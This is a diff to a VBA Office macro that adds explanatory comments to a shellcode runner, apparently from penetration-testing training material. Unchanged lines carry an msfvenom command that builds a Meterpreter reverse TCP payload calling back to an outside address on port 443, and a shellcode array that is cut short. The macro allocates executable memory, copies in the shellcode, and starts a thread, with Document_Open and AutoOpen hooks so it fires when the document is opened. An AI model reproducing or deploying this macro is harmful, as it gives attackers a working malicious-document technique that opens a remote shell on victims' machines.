@@ -13,18 +13,25 @@ Function mymacro()
     ' msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.1 LPORT=443 EXITFUNC=thread -f vbapplication    
     buf = Array(232, 130, 0, 0, ...
 
+    ' Allocate executable memory in the process' address space 
+    ' &H3000 = Allocation Type (MEM_COMMIT | MEM_RESERVE)
+    ' &H40 = Protection Flags (PAGE_EXECUTE_READWRITE)
     addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
     For counter = LBound(buf) To UBound(buf)
         data = buf(counter)
+        ' Copy bytes from the shellcode buffer into the allocated memory
         res = RtlMoveMemory(addr + counter, data, 1)
     Next counter
-    
+
+    ' Create a new thread in the current process
     res = CreateThread(0, 0, addr, 0, 0, 0)
 
+' Used to automatically call the shellcode function
 Sub Document_Open()
     mymacro
 End Sub
 
+' Used to automatically call the shellcode function
 Sub AutoOpen()
     mymacro
 End Sub
